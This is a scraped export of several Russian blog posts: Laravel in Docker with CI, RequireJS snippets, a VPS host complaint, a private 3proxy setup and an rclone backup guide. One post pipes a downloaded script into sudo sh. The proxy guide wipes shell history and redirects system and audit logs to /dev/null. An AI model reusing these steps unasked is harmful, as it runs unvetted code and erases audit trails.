ним могли работать frontend и backend разработчики, и запуск его на production был максимально прост. Так же CI будет автоматически запускать статические анализаторы кода, phpunit-тесты, производить сборку образов.\n\u0026ldquo;А в чём, собственно, сложность?\u0026rdquo; - можешь сказать ты, и будешь отчасти прав. Дело в том, что этой теме посвящено довольно много обсуждений в русскоязычных и англоязычных комьюнити, и почти все изученные треды я бы условно разделил на следующие категории:\n \u0026ldquo;Использую докер для локальной разработки. Ставлю laradock и беды не знаю\u0026rdquo;. Круто, но как обстоят дела с автоматизацией и запуском на production? \u0026ldquo;Собираю один контейнер (монолит) на базе fedora:latest (~230 Mb), ставлю в него все сервисы (nginx, бд, кэш, etc), запускаю всё супервизором внутри\u0026rdquo;. Тоже отлично, прост в запуске, но как на счёт идеологии \u0026ldquo;один контейнер - один процесс\u0026rdquo;? Как обстоят дела с балансировкой и управлением процессами? Как же размер образа? \u0026ldquo;Вот вам куски конфигов, приправляем выдержками из sh-скриптов, добавим магических env-значений, пользуйтесь\u0026rdquo;. Спасибо, но как же на счёт хотя бы одного живого примера, который я бы мог форкнуть и полноценно поиграться?  Всё, что ты прочитаешь ниже - является субъективным опытом, который не претендует быть истиной в последней инстанции. Если у тебя будут дополнения или указания на неточности - welcome to comments.\n Для нетерпеливых - ссылка на репозиторий, склонировав который ты сможешь запустить Laravel-приложение одной командой. Так же не составит труда его запустить на том же rancher, правильно \u0026ldquo;слинковав\u0026rdquo; контейнеры, или использовать продуктовый вариант docker-compose.yml как отправную точку.\n Часть теоретическая Какие инструменты мы будем использовать в своей работе, и на что сделаем акценты? Первым делом нам понадобятся установленные на хосте:\n docker - на момент написания статьи использовал версию 18.06.1-ce docker-compose - он отлично справляется с линковкой контейнеров и хранением необходимых environment значений; версия 1.22.0 make - возможно ты удивишься, но он отлично \u0026ldquo;вписывается\u0026rdquo; в контекст работы с докером   Поставить docker на debian-like системы можно командой curl -fsSL get.docker.com | sudo sh, а вот docker-compose лучше ставь с помощью pip, так как в его репозиториях обитают наиболее свежие версии (apt сильно отстают, как правило).\n На этом список зависимостей можно завершить. Что ты будешь использовать для работы с исходниками - phpstorm, netbeans или трушный vim - только тебе решать.\nДальше - импровизированный QA в контексте (не побоюсь этого слова) проектирования образов:\n  Q: Базовый образ - какой лучше выбрать?\n  A: Тот, что \u0026ldquo;потоньше\u0026rdquo;, без излишеств. На базе alpine (~5 Mb) можно собрать всё, что душе угодно, но скорее всего придётся поиграться со сборкой сервисов из исходников. Как альтернатива - jessie-slim (~30 Mb). Или же использовать тот, что наиболее часто используется у вас на проектах.\n  Q: Почему вес образа - это важно?\n  A: Снижение объёма трафика, снижение вероятности ошибки при скачивании (меньше данных - меньше вероятность), снижение потребляемого места. Правило \u0026ldquo;Тяжесть — это надёжно\u0026rdquo; (© \u0026ldquo;Snatch\u0026rdquo;) тут не очень работает.\n  Q: А вот мой друг %friend_name% говорит, что \u0026ldquo;монолитный\u0026rdquo; образ со всеми-всеми зависимостями - это самый лучший путь.\n  A: Давай просто посчитаем. Приложение имеет 3 зависимости - PG, Redis, PHP. И тебе захотелось протестировать как оно у тебя будет себя вести в связках различных версий этих зависимостей. PG - версии 9.6 и 10, Redis - 3.2 и 4.0, PHP - 7.0 и 7.2. В случае, если каждая зависимость это отдельный образ - тебе их потребуется 6 штук, которые даже собирать не надо - всё уже готово и лежит на hub.docker.com. Если же по идеологическим соображениям все зависимости \u0026ldquo;упакованы\u0026rdquo; в один контейнер, тебе придётся его ручками пересобрать\u0026hellip; 8 раз? А теперь добавь условие, что ты ещё хочешь и с opcache поиграться. В случае декомпозиции - это просто изменение тегов используемых образов. Монолит проще запускать и обслуживать, но это путь в никуда.\n  Q: Почему супервизор в контейнере - это зло?\n  A: Потому что PID 1. Не хочешь обилия проблем с зомби-процессами и иметь возможность гибко \u0026ldquo;добавлять мощностей\u0026rdquo; там, где это необходимо - старайся запускать один процесс на контейнер. Своеобразными исключениями является nginx со своими воркерами и php-fpm, которые имеют свойство плодить процессы, но с этим приходится мириться (более того - они не плохо умеют реагировать на SIGTERM, вполне корректно \u0026ldquo;убивая\u0026rdquo; своих воркеров). Запустив же всех демонов супервизором - фактически наверняка ты обрекаешь себя на проблемы. Хотя, в некоторых случаях - без него сложно обойтись, но это уже исключения.\n  Определившись с основными подходами давай перейдём к нашему приложению. Оно должно уметь:\n web|api - отдавать статику силами nginx, а динамический контент генерировать силами fpm scheduler - запускать родной планировщик задач queue - обрабатывать задания из очередей  Базовый набор, который при необходимости можно будет расширить. Теперь перейдём к образам, которые нам предстоит собрать для того, что бы наше приложение \u0026ldquo;взлетело\u0026rdquo; (в скобках приведены их кодовые имена):\n PHP + PHP-FPM (app) - среда, в которой будет выполняться наш код. Так как версии PHP и FPM у нас будут совпадать - собираем их в одном образе. Так и с конфигами легче управляться, и состав пакетов будет идентичный. Разумеется - FPM и процессы приложения будут запускаться в разных контейнерах nginx (nginx) - что бы не заморачиваться с доставкой конфигов и опциональных модулей для nginx - будем собирать отдельный образ с ним. Так как он является отдельным сервисом - у него свой докер-файл и свой контекст Исходники приложения (sources) - доставка исходников будет производиться используя отдельный образ, монтируя volume с ними в контейнер с app. Базовый образ - alpine, внутри - только исходники с установленными зависимостями и собранными с помощью webpack asset-ами (артефакты сборки)  Остальные сервисы для разработки запускаются в контейнерах, стянув их с hub.docker.com; на production же - они запущены на отдельных серверах, объединенных в кластеры. Всё что нам останется - это сказать приложению (через environment) по каким адресам\\портам и с какими реквизитами необходимо до них стучаться. Ещё круче - это использовать в этих целях service-discovery, но об этом не в этот раз.\nОпределившись с частью теоретической - предлагаю перейти к следующей части.\nЧасть практическая Организовать файлы в репозитории предлагаю следующим образом:\n. ├── docker # Директория для хранения докер-файлов необходимых сервисов │ ├── app │ │ ├── Dockerfile │ │ └── ... │ ├── nginx │ │ ├── Dockerfile │ │ └── ... │ └── sources │ ├── Dockerfile │ └── ... ├── src # Исходники приложения │ ├── app │ ├── bootstrap │ ├── config │ ├── artisan │ └── ... ├── docker-compose.yml # Compose-конфиг для локальной разработки ├── Makefile ├── CHANGELOG.md └── README.md  Ознакомиться со структурой и файлами ты можешь перейдя по этой ссылке.\n Для сборки того или иного сервиса можно воспользоваться командой:\n$ docker build \\  --tag %local_image_name% \\  -f ./docker/%service_directory%/Dockerfile ./docker/%service_directory% Единственным отличием будет сборка образа с исходниками - для него необходимо контекст сборки (крайний аргумент) указать равным ./src.\nПравила именования образов в локальном registry рекомендую использовать те, что использует docker-compose по умолчанию, а именно: %root_directory_name%_%service_name%. Если директория с проектом называется my-awesome-project, а сервис носит имя redis, то имя образа (локального) лучше выбрать my-awesome-project_redis соответственно.\n Для ускорения процесса сборки можно сказать докеру использовать кэш ранее собранного образа, и для этого используется параметр запуска --cache-from %full_registry_name%. Таким образом демон докера перед запуском той или иной инструкции в Dockerfile посмотрит - изменились ли она? И если нет (хэш сойдётся) - он пропустит инструкцию, используя уже готовый слой из образа, который ты укажешь ему использовать в качестве кэша. Эта штука не плохо так бустит процесс пересборки, особенно, если ничего не изменилось :)\n  Обрати внимание на ENTRYPOINT скрипты запуска контейнеров приложения.\n Образ среды для запуска приложения (app) собирался с учётом того, что он будет работать не только на production, но ещё и локально разработчикам необходимо с ним эффективно взаимодействовать. Установка и удаление composer-зависимостей, запуск unit-тестов, tail логов и использование привычных алиасов (php /app/artisan → art, composer → c) должно быть без какого либо дискомфорта. Более того - он же будет использоваться для запуска unit-тестов и статических анализаторов кода (phpstan в нашем случае) на CI. Именно поэтому его Dockerfile, к примеру, содержит строчку установки xdebug, но сам модуль не включен (он включается только с использованием CI).\n Так же для composer глобально ставится пакет hirak/prestissimo, который сильно бустит процесс установки всех зависимостей.\n На production мы монтируем внутрь него в директорию /app содержимое директории /src из образа с исходниками (sources). Для разработки - \u0026ldquo;прокидываем\u0026rdquo; локальную директорию с исходниками приложения (-v \u0026quot;$(pwd)/src:/app:rw\u0026quot;).\nИ вот тут кроется одна сложность - это права доступа на файлы, которые создаются из контейнера. Дело в том что по умолчанию процессы, запущенные внутри контейнера - запускаются от рута (root:root), создаваемые этими процессами файлы (кэш, логи, сессии, etc) - тоже, и как следствие - \u0026ldquo;локально\u0026rdquo; с ними ты уже ничего не сможешь сделать, не выполнив sudo chown -R $(id -u):$(id -g) /path/to/sources.\nКак один из вариантов решения - это использование fixuid, но это решение прям \u0026ldquo;так себе\u0026rdquo;. Лучшим путём мне показался проброс локальных USER_ID и его GROUP_ID внутрь контейнера, и запуск процессов с этими значениями. По умолчанию подставляя значения 1000:1000 (значения по умолчанию для первого локального пользователя) избавился от вызова $(id -u):$(id -g), а при необходимости - ты всегда их можешь переопределить ($ USER_ID=666 docker-compose up -d) или сунуть в .env файл docker-compose.\nТак же при локальном запуске php-fpm не забудь отключить у него opcache - иначе куча \u0026ldquo;да что за чертовщина!\u0026rdquo; тебе будут обеспечены.\nДля \u0026ldquo;прямого\u0026rdquo; подключения к redis и postgres - прокинул дополнительные порты \u0026ldquo;наружу\u0026rdquo; (16379 и 15432 соответственно), так что проблем с тем, чтоб \u0026ldquo;подключиться да посмотреть что да как там на самом деле\u0026rdquo; не возникает в принципе.\nКонтейнер с кодовым именем app держу запущенным (--command keep-alive.sh) с целью удобного доступа к приложению.\nВот несколько примеров решения \u0026ldquo;бытовых\u0026rdquo; задач с помощью docker-compose:\n   Операция Выполняемая команда     Установка compose-пакета $ docker-compose exec app composer require package/name   Запуск phpunit $ docker-compose exec app php ./vendor/bin/phpunit --no-coverage   Установка всех node-зависимостей $ docker-compose run --rm node npm install   Установка node-пакета $ docker-compose run --rm node npm i package_name   Запуск \u0026ldquo;живой\u0026rdquo; пересборки asset-ов $ docker-compose run --rm node npm run watch    Все детали запуска ты сможешь найти в файле docker-compose.yml.\nЦой make жив! Набивать одни и те же команды каждый раз становится скучно после второго раза, и так как программисты по своей натуре - существа ленивые, давай займёмся их \u0026ldquo;автоматизацией\u0026rdquo;. Держать набор sh-скриптов - вариант, но не такой привлекательный, как один Makefile, тем более что его применимость в современной разработке сильно недооценена.\nДавай посмотри как выглядит запуск make в корне репозитория:\n[user@host ~/projects/app] $ make help Show this help app-pull Application - pull latest Docker image (from remote registry) app Application - build Docker image locally app-push Application - tag and push Docker image into remote registry sources-pull Sources - pull latest Docker image (from remote registry) sources Sources - build Docker image locally sources-push Sources - tag and push Docker image into remote registry nginx-pull Nginx - pull latest Docker image (from remote registry) nginx Nginx - build Docker image locally nginx-push Nginx - tag and push Docker image into remote registry pull Pull all Docker images (from remote registry) build Build all Docker images push Tag and push all Docker images into remote registry login Log in to a remote Docker registry clean Remove images from local registry --------------- --------------- up Start all containers (in background) for development down Stop all started for development containers restart Restart all started for development containers shell Start shell into application container install Install application dependencies into application container watch Start watching assets for changes (node) init Make full application initialization (install, seed, build assets, etc) test Execute application tests Allowed for overriding next properties: PULL_TAG - Tag for pulling images before building own (\u0026#39;latest\u0026#39; by default) PUBLISH_TAGS - Tags list for building and pushing into remote registry (delimiter - single space, \u0026#39;latest\u0026#39; by default) Usage example: make PULL_TAG=\u0026#39;v1.2.3\u0026#39; PUBLISH_TAGS=\u0026#39;latest v1.2.3 test-tag\u0026#39; app-push Он очень хорош зависимостью целей. Например, для запуска watch (docker-compose run --rm node npm run watch) необходимо что бы приложение было \u0026ldquo;поднято\u0026rdquo; - тебе достаточно указать цель up как зависимую - и можешь не беспокоиться о том, что ты забудешь это сделать перед вызовом watch - make сам всё сделает за тебя. То же касается запуска тестов и статических анализаторов, например, перед коммитом изменений - выполни make test и вся магия произойдет за тебя!\nСтоит ли говорить о том, что для сборки образов, их скачивания, указания --cache-from и всего-всего - уже не стоит беспокоиться?\nОзнакомиться с содержанием Makefile ты можешь по этой ссылке.\nЧасть автоматическая Приступим к финальной части данной статьи - это автоматизация процесса обновления образов в Docker Registry. Хоть в моём примере и используется GitLab CI - перенести идею на другой сервис интеграции, думаю, будет вполне возможно.\nПервым делом определимся и именованием используемых тегов образов:\n   Имя тега Предназначение     latest Образы, собранные с ветки master. Состояние кода является самым \u0026ldquo;свежим\u0026rdquo;, но ещё не готовым к тому, что бы попасть в релиз   some-branch-name Образы, собранные на бранче some-branch-name. Таким образом мы можем на любом окружении \u0026ldquo;раскатать\u0026rdquo; изменения которые были реализованы только в рамках конкретного бранча ещё до их сливания с master-веткой - достаточно \u0026ldquo;вытянуть\u0026rdquo; образы с этим тегом. И - да, изменения могут касаться как кода, так и образов всех сервисов в целом!   vX.X.X Собственно, релиз приложения (использовать для разворачивания конкретной версии)   stable Алиас, для тега со самым свежим релизом (использовать для разворачивания самой свежей стабильной версии)    Для ускорения сборки используется кэширование директорий ./src/vendor и ./src/node_modules + --cache-from для docker build, и состоит из следующих этапов (stages):\n   Имя этапа Предназначение     prepare Подготовительный этап - сборка образов всех сервисов кроме образа с исходниками   test Тестирование приложения (запуск phpunit, статических анализаторов кода) используя образы, собранные на этапе prepare   build Установка всех composer зависимостей (--no-dev), сборка assets силами webpack, и сборка образа с исходниками включая полученные артефакты (vendor/*, app.js, app.css)     pipelines screenshot \n Сборка на master-ветке, производящая push с тегами latest и master\n В среднем, все этапы сборки занимают 4 минуты, что довольно хороший результат (параллельное выполнение задач - наше всё).\nОзнакомиться с содержанием конфигурации (.gitlab-ci.yml) сборщика можешь ознакомиться по этой ссылке.\nВместо заключения Как видишь - организовать работу с php-приложением (на примере Laravel) используя Docker не так то и сложно. В качестве теста можешь форкнуть репозиторий, и заменив все вхождения tarampampam/laravel-in-docker на свои - попробовать всё \u0026ldquo;в живую\u0026rdquo; самостоятельно.\nДля локального запуска - выполни всего 2 команды:\n$ git clone https://gitlab.com/tarampampam/laravel-in-docker.git ./laravel-in-docker \u0026amp;\u0026amp; cd $_ $ make init После чего открой http://127.0.0.1:9999 в своём любимом браузере.\n","date":"2018-10-01T08:29:51Z","image":"https://blog.hook.sh/laravel-in-docker/cover_hua8f71ffb89a9e5aa8906e7ae93fcb2fc_87557_120x120_fill_box_smart1_2.png","permalink":"https://blog.hook.sh/laravel-in-docker/","title":"Docker + Laravel = ❤"},{"content":"Мне нравится RequireJS. Нравятся принцип построения приложения с его использованием, то как он работает с зависимостями, его гибкость и настраиваемость. Но часто может возникать проблема при разработке на локале - кэширование ресурсов браузером (файл подправил, а изменения не отображаются, так как файл берется из кэша).\nМожно, конечно, открыть консоль и поставить флаг запрещающий кэширование, можно подправить конфиг web-демона так, чтоб он запрещал кэширование, а можно пойти другим путем - заставить requirejs добавлять рандомный параметр к своим запросам, таким образом заставляя браузер не брать файл из кэша.\nДля настройки requirejs я использую отдельный файл-конфигурацию, который загружается перед самой библиотекой, и содержит в себе как описания путей, зависимостей и прочие штуки - так и немного уличной магии.\nНиже будет пример его содержания в полном объеме, и думаю что комментарии тут будут излишне (ссылка на док). Такой код можно оставить работать и на продакшене без особых переживаний, но для разработки на локале есть как минимум одно очевидное ограничение - необходимо чтоб домен верхнего уровня был указан в массиве local, а так как для всех своих локальных проектов использую домен верхнего уровня dev - неудобств совсем не замечаю.\n// @file ./js/config.js  \u0026#39;use strict\u0026#39;; /** * Requite.js configuration. * * @type {Object} */ var require = { paths: { app: \u0026#39;js/app\u0026#39;, // Components  jquery: \u0026#39;vendor/jquery/dist/jquery.min\u0026#39;, bootstrap: \u0026#39;vendor/bootstrap/dist/js/bootstrap.min\u0026#39; }, shim: { bootstrap: { deps: [\u0026#39;jquery\u0026#39;] } }, deps: [\u0026#39;bootstrap\u0026#39;] // An array of dependencies to load }; /** * Disable cache for requirejs resources while develop. * * @param {Object} require * @returns {undefined} */ (function (require) { if (require !== false) { /** * Make test - is \u0026#39;local\u0026#39; domain name? * * @returns {Boolean} */ var isLocalDomain = function () { var host_name = document.location.hostname || window.location.host, local = [\u0026#39;dev\u0026#39;, \u0026#39;local\u0026#39;, \u0026#39;localhost\u0026#39;, \u0026#39;test\u0026#39;, \u0026#39;env\u0026#39;]; if (typeof host_name === \u0026#39;string\u0026#39;) { var parts = host_name.split(\u0026#39;.\u0026#39;), last = parts[parts.length - 1]; if (parts.length === 1 || (!isNaN(parseFloat(last)) \u0026amp;\u0026amp; isFinite(last))) { return true; } else { for (var i = 0, len = local.length; i \u0026lt; len; i++) { if (local[i] === last) { return true; } } } } return false; }; /** * Append \u0026#39;urlArgs\u0026#39; property. */ require.urlArgs = isLocalDomain() ? (new Date()).getTime().toString() : null; } })(typeof require === \u0026#39;object\u0026#39; ? require : false); ","date":"2017-02-19T19:16:00Z","image":"https://blog.hook.sh/disable-cacheing-requirejs-files-while-develop/cover_hu30c3e7f4088a0dadce48d1d04a5455c7_31682_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.hook.sh/disable-cacheing-requirejs-files-while-develop/","title":"Отключаем кэширование загружаемых RequireJS файлов при разработке"},{"content":"Частенько при разработке приложения с использованием requirejs возникает необходимость в реализации паттерна синглтона. И вот, испробовав пример его реализации что описан ниже заявляю - он имеет право на жизнь. Не без своих недостатков, разумеется, но в целом вполне применибельно:\n\u0026#39;use strict\u0026#39;; define([], function () { /** * Singletone instance. * * @type {OurNewSingletone|null} */ var instance = null; /** * OurNewSingletone object (as singletone). * * @returns {OurNewSingletone} */ var OurNewSingletone = function () { /** * Initialize method. * * @returns {} */ this.init = function () { // Make init  }; // Check instance exists  if (instance !== null) { throw new Error(\u0026#39;Cannot instantiate more than one instance, use .getInstance()\u0026#39;); } // Execute initialize method  this.init(); }; /** * Returns OurNewSingletone object instance. * * @returns {null|OurNewSingletone} */ OurNewSingletone.__proto__.getInstance = function () { if (instance === null) { instance = new OurNewSingletone(); } return instance; }; // Return singletone instance  return OurNewSingletone.getInstance(); }); И после, указывая наш модуль в зависимостях - мы получаем уже готовый к работе инстанс объекта (один и тот же в разных модулях), что и требуется.\n","date":"2017-02-18T05:19:58Z","image":"https://blog.hook.sh/requirejs-singletone/cover_hu30c3e7f4088a0dadce48d1d04a5455c7_31682_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.hook.sh/requirejs-singletone/","title":"Синглтон для RequireJS"},{"content":"Данный пост - предостережение тем, кто решил приобрести у них какие-либо услуги, и услуги VPS - в частности. Тем, кто перед оплатой решил поискать о них отзывы. Ниже будет аргументированное мнение, почему они являются куском говна:\n Нет информации про юрлицо, лицензии и т.д.; Покупают положительные отзывы. Мне предлагали зачисление на мой баланс месячной стоимости аренды VPS сервера за позитивный пост об их услугах в блоге или соц. сетях. Это сразу насторожило, но сперва не придал этому значения. А зря; Ужасная поддержка. Телефон не отвечает. Система тикетов - убогая. Для управления учетной записью и серверами, что прикреплены к этой учетной записи - две отдельных панели с разными логинами/паролями. Нет уведомлений об ответах на тикеты - вот сиди и сам проверяй - ответил тебе кто-нибудь, или нет; Выдают IP адреса, находящиеся в черных списках, спам-листах и т.д. Такое ощущение, что они сами не стесняются заниматься спамом и \u0026ldquo;чернухой\u0026rdquo;, или их клиенты их же используют в основном именно для этого; Выделяемые ресурсы не соответствуют заявленным. На сервере крутил только 3proxy крайней версии собранный из исходников. Через сутки сервер просто умирал в прямом смысле этого слова. Только рестарт через панель управления спасал ситуацию, и то - только на сутки. Не верите? Вот ссылка на скриншот. Для эксперимента снёс всё, и поставил чистую ОС. Ресурсы даже на чистой ОС просто утекают куда-то в линейной прогрессии! Сервер доступен не отовсюду. Cо своего рабочего IP не мог подключиться к серверу! Поддержка говорит \u0026ldquo;А мы ничего не знаем, проблема не с нашей стороны\u0026rdquo;, хотя проблема ТОЛЬКО с ними; Разводят на более дорогие тарифы; Чтоб написать в саппорт - надо ПОКУПАТЬ РАЗРЕШЕНИЯ! ПОКУПАТЬ, КАРЛ (скриншот)! Деньги не возвращают, даже при обосновании того что они не оказали заказанные услуги в полном объеме;  Вывод: Рекомендуйте их своим врагам. Пускай оплачивают вперед. Тратят нервы, силы, деньги, человеческие ресурсы. Сами же обходите их стороной, при возможности всем рассказывая кто они такие на самом деле.\n","date":"2016-08-20T06:27:33Z","permalink":"https://blog.hook.sh/cloud4box-com-review/","title":"Отзыв о cloud4box.com"},{"content":"Сегодня мы будем поднимать анонимный и действительно шустренький proxy/socks сервер для себя-любимого. Так чтоб настроить его один раз, да и забыть - пускай пыхтит да нам на радость.\nБудем считать что ты уже приобрел себе простенький vps, в качестве ОС выбрал Cent OS 7 и подцепился к нему по SSH, наблюдая девственную чистоту. Первым делом тюним SSH:\n# Первым делом меняем пароль, который мы получили в письме на новый: $ passwd # Перевешиваем SSH на порт 7788: $ sed -i -r \u0026#34;s/#Port 22/Port 7788/\u0026#34; /etc/ssh/sshd_config # Требуем вторую версию протокола и ограничиваем количество неудачных попыток входа: $ sed -i -r -e \u0026#34;s/#Protocol 2/Protocol 2/\u0026#34; -e \u0026#34;s/#MaxAuthTries 6/MaxAuthTries 1/\u0026#34; /etc/ssh/sshd_config # При необходимости отключаем selinux, так как в нашем случае он откровенно лишний # Перезапускаем демона: $ service sshd restart # Проверяем, изменился ли порт: $ ss -tnlp | grep ssh LISTEN 0 128 *:7788 *:* users:((\u0026#34;sshd\u0026#34;,pid=1029,fd=3)) LISTEN 0 128 :::7788 :::* users:((\u0026#34;sshd\u0026#34;,pid=1029,fd=4)) # Открываем порт 7788: $ firewall-cmd --zone=public --add-port=7788/tcp --permanent $ firewall-cmd --reload # Выходим и переподключаемся на **новый** порт $ logout Займемся отключением излишнего логирования, и чутка наведем красоту:\n$ unset HISTFILE $ echo \u0026#39;unset HISTFILE\u0026#39; \u0026gt;\u0026gt; /etc/bashrc # Ставим нано и выставляем его как редактор по умолчанию $ yum -y install nano $ echo \u0026#39;export VISUAL=nano\u0026#39; \u0026gt;\u0026gt; /etc/bashrc $ echo \u0026#39;export EDITOR=nano\u0026#39; \u0026gt;\u0026gt; /etc/bashrc # Опционально: # $ service rsyslog stop \u0026amp;\u0026amp; systemctl disable syslog # $ service auditd stop \u0026amp;\u0026amp; systemctl disable auditd $ unlink /var/log/lastlog \u0026amp;\u0026amp; ln -s /dev/null /var/log/lastlog $ unlink /var/log/audit/audit.log \u0026amp;\u0026amp; ln -s /dev/null /var/log/audit/audit.log $ unlink /var/log/secure \u0026amp;\u0026amp; ln -s /dev/null /var/log/secure $ unlink /var/log/wtmp \u0026amp;\u0026amp; ln -s /dev/null /var/log/wtmp $ unlink /var/log/btmp \u0026amp;\u0026amp; ln -s /dev/null /var/log/btmp $ rm -f ~/.bash_history # Красотульки $ echo \u0026#39;proxy-server\u0026#39; \u0026gt; /etc/hostname $ hostname proxy-server $ echo \u0026#39;export PS1=\u0026#34;\\[$(tput bold)\\]\\[$(tput setaf 7)\\][\\[$(tput setaf 1)\\]\\u\\[$(tput setaf 7)\\]@\\[$(tput setaf 5)\\]\\h \\[$(tput setaf 2)\\]\\w\\[$(tput setaf 7)\\]]\\\\$ \\[$(tput sgr0)\\]\u0026#34;\u0026#39; \u0026gt;\u0026gt; /etc/bashrc # Ребутим, цепляемся по новой, проверяем логи на чистоту grep -rnw \u0026#39;/var\u0026#39; -e \u0026#34;%your_real_ap_addr%\u0026#34; $ reboot Теперь поставим прокси-сервер 3proxy (aka зараза-прокси) из исходников, и настроим его:\n$ cd ~ $ yum -y install gcc $ wget https://github.com/z3APA3A/3proxy/archive/3proxy-0.8.6.tar.gz $ tar -xvzf 3proxy-*.gz $ cd 3proxy-3proxy-* $ sed -i \u0026#39;1s/^/#define ANONYMOUS 1\\n/\u0026#39; ./src/proxy.h # Делает сервер полностью анонимным $ make -f Makefile.Linux $ mkdir -p /usr/local/etc/3proxy/bin $ touch /usr/local/etc/3proxy/3proxy.pid $ cp ./src/3proxy /usr/local/etc/3proxy/bin $ cp ./scripts/rc.d/proxy.sh /etc/init.d/3proxy $ cp ./cfg/3proxy.cfg.sample /usr/local/etc/3proxy/3proxy.cfg $ ln -s /usr/local/etc/3proxy/3proxy.cfg /etc/3proxy.cfg $ chmod +x /etc/init.d/3proxy # Настраиваем: $ nano /etc/3proxy.cfg daemon pidfile /usr/local/etc/3proxy/3proxy.pid nserver 8.8.4.4 nserver 8.8.8.8 nscache 65536 timeouts 1 5 30 60 180 1800 15 60 log /dev/null auth none maxconn 64 proxy -p13231 -n -a socks -p14541 -n -a Что означает, что прокси-сервер лог принудительно не пишет; для авторизации никаких паролей не просит; proxy работает на порту 13231, socks на 14541; сервер запущен с правами root (да и насрать).\nЗапускаем его и ставим в автозагрузку:\n$ service 3proxy start $ systemctl enable 3proxy И если всё хорошо - сносим исходники 3proxy как уже не нужные:\n$ rm -Rf ~/3proxy-* Дальше - настраиваем огненную стену:\n# Открываем порт для http- и socks- прокси: $ firewall-cmd --zone=public --add-port=13231/tcp --permanent $ firewall-cmd --zone=public --add-port=14541/tcp --permanent $ firewall-cmd --reload # Блокируем ICMP трафик (echo-запросы) для того, чтоб наш сервер **не отвечал** на пинги: # Проверяем состояние: $ firewall-cmd --zone=public --query-icmp-block=echo-reply $ firewall-cmd --zone=public --query-icmp-block=echo-request # Блокируем: $ firewall-cmd --zone=public --add-icmp-block=echo-reply --permanent $ firewall-cmd --zone=public --add-icmp-block=echo-request --permanent # Перечитаем правила: $ firewall-cmd --reload # И проверим теперь: $ firewall-cmd --zone=public --query-icmp-block=echo-reply $ firewall-cmd --zone=public --query-icmp-block=echo-request И проверяем - всё должно работать. Шустренький и беспалевный прокси-сервер готов! Для проверки заходим через него, например, на 2ip.ru, и видим:\nОткуда вы: Ukraine Украина, Киев Ваш провайдер: ВестКолл Домашние сети  Лучше будет ещё добавить в крон что-то вроде:\n30 */3 * * * service 3proxy restart 0 */12 * * * reboot -f  Ну разве не профит, учитывая что физически серваки находятся в москве?\n","date":"2016-08-13T10:57:36Z","image":"https://blog.hook.sh/setup-private-proxy-server/cover_hu07b4d3c852e20c10f4c2e2e158cf3f2d_95916_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.hook.sh/setup-private-proxy-server/","title":"Поднимаем свой, приватный прокси-сервер"},{"content":"Сегодня мы поговорим об одном интересном, простом в обращении и в какой-то мере уникальном инструменте. Знакомьтесь: rclone. Разработчики описывают его краткой и ёмкой фразой - \u0026ldquo;rsync для облачных хранилищ\u0026rdquo;.\nОсновная функция rclone - это синхронизация данных в хранилище и на локальной машине. Утилита несомненна окажется полезной для широкого круга пользователей облачного хранилища. Её можно использовать и для резервного копирования, и в работе со статическими сайтами, и для удобного доступа к файлам на яндекс.диске (да и не только).\nУстановка Rclone может работать на различных ОС - Linux, Windows, MacOS, Solaris, FreeBSD, OpenBSD, NetBSD и Plan 9. В нашем случае мы будем рассматривать его установку на Linux-сервер (CentOS 7 x64) с простой целью - дублировать файлы бэкапов в облаке яндекс.диска. Дистрибутивы под все доступные системы можно найти на странице загрузок.\nИтак - качаем дистрибутив, распаковываем, и рассовываем файлы по директориям (работал под рутом):\n$ cd ~ $ wget http://downloads.rclone.org/rclone-current-linux-amd64.zip $ unzip ./rclone-current-linux-amd64.zip $ cd ./rclone-*-amd64/ $ cp ./rclone /usr/sbin/rclone \u0026amp;\u0026amp; chmod 755 /usr/sbin/rclone $ mkdir -p /usr/local/share/man/man1 $ cp ./rclone.1 /usr/local/share/man/man1/ $ mandb Настройка Теперь нам придется поставить клиент rclone на свой десктоп с веб-браузером (данный шаг можно совместить, если ставишь на машину с gui), так как для получения токена потребуется авторизоваться через браузер.\nВ нашем случае мы будем использовать windows-машину, для чего переходим на страницу загрузок\u0026lt; и скачал скачиваем соответствующий клиент.\nИз архива извлекаем бинарник rclone.exe и размещаем его в корне диска c:\\. После чего запускаем cmd и в консоли выполняем:\ncd /d c:\\ c:\\\u0026gt; rclone.exe config No remotes found - make a new one n) New remote s) Set configuration password q) Quit config n/s/q\u0026gt; n name\u0026gt; yandex client_id\u0026gt; # Оставляем пустым client_secret\u0026gt; # Тоже оставляем пустым Remote config Use auto config? * Say Y if not sure * Say N if you are working on a remote or headless machine y) Yes n) No y/n\u0026gt; y # Открывается окно браузера, в котором вводим логин:пароль от учетки ЯД Waiting for code... Got code -------------------- [yandex] client_id = client_secret = token = {\u0026#34;access_token\u0026#34;:\u0026#34;AQA...OuQ\u0026#34;,\u0026#34;token_type\u0026#34;:\u0026#34;bearer\u0026#34;,\u0026#34;expiry\u0026#34;:\u0026#34;2017-0..02+00:00\u0026#34;} -------------------- y) Yes this is OK e) Edit this remote d) Delete this remote y/e/d\u0026gt; y Current remotes: Name Type ==== ==== yandex yandex e) Edit existing remote n) New remote d) Delete remote s) Set configuration password q) Quit config e/n/d/s/q\u0026gt; q c:\\\u0026gt; rclone.exe --help # Смотрим строку --config string Config file. (default \u0026#34;C:\\\\Users\\\\USERNAME/.rclone.conf\u0026#34;) c:\\\u0026gt; type C:\\Users\\USERNAME\\.rclone.conf [yandex] type = yandex client_id = client_secret = token = {\u0026#34;access_token\u0026#34;:\u0026#34;AQA...OuQ\u0026#34;,\u0026#34;token_type\u0026#34;:\u0026#34;bearer\u0026#34;,\u0026#34;expiry\u0026#34;:\u0026#34;2017-0..02+00:00\u0026#34;} Теперь нужно этот конфиг (что был выведен крайней командой) перенести на наш сервер, для чего его нежно копируем в буфер обмена, и возвращаемся к терминалу:\n$ rclone --help 2\u0026gt;\u0026amp;1 | grep -e \u0026#39;--config\u0026#39; --config string Config file. (default \u0026#34;/root/.rclone.conf\u0026#34;) # создаем конфиг по указанному пути и вставляем в него содержимое конфига с десктопа: $ nano /root/.rclone.conf Проверка Остается только проверить работу rclone путем создания на яндекс.диске директории средствами терминала, и синхронизации её с локальной директорией, где у нас хранятся бэкапы (в нашем примере это директория /var/backups):\n# Проверяем $ rclone lsd yandex: # Создаем директорию для бэкапов, например $ rclone mkdir yandex:backups # И заливаем в неё (синхронизируем содержимое локального каталога с директорией в облаке): $ rclone sync /var/backups yandex:backups Теперь проверяем наличие файлов через веб-морду диска, и опционально ставим крайнюю 